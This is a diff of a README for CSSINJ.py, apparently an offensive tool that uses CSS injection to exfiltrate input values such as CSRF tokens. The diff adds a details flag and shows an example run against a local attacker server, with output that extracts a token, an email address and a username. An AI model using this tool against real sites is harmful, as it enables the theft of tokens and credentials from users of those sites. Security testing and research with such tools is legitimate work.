@@ -44,11 +44,12 @@ python3 CSSINJ.py [-h] -H HOSTNAME -p PORT -i IDENTIFIER
 | `-H, --hostname`       | Attacker hostname or IP address             |
 | `-p, --port`           | Port number of the attacker                 |
 | `-i, --identifier`     | CSS identifier (CSS selector) to extract data |
+| `-d, --details`        | Show detailed logs of the exfiltration process, including extracted data. |
 
 ### Example  
 
 ```bash
-~ python3 CSSINJ.py -H 127.0.0.1 -p 5005 -i input.csrf
+~ python3 CSSINJ.py -H 127.0.0.1 -p 5005 -i input
   _____   _____   _____  _____  _   _       _     _____  __     __
  / ____| / ____| / ____||_   _|| \ | |     | |   |  __ \ \ \   / /
 | |     | (___  | (___    | |  |  \| |     | |   | |__) | \ \_/ /
@@ -56,13 +57,11 @@ python3 CSSINJ.py [-h] -H HOSTNAME -p PORT -i IDENTIFIER
 | |____  ____) | ____) | _| |_ | |\  || |__| | _ | |        | |
  \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|
 
-[✓] Attacker's server started on 127.0.0.1:5005
-[✓] Connection from ::1
-[ⓘ] Token is M
-[ⓘ] Token is My
-[ⓘ] Token is MyS
-...
-[✓] The token is : MySecreteValue
+[2025-03-11 02:40:55] 🛠️ Attacker's server started on 127.0.0.1:5001
+[2025-03-11 02:40:56] 🌐 Connection from ::1
+[2025-03-11 02:40:56] ✅ The value exfiltrated from input is : MySecretToken123
+[2025-03-11 02:40:56] ✅ The value exfiltrated from input is : admin@example.com
+[2025-03-11 02:40:56] ✅ The value exfiltrated from input is : admin
 ```
 
 ## Browser-Specific Behavior
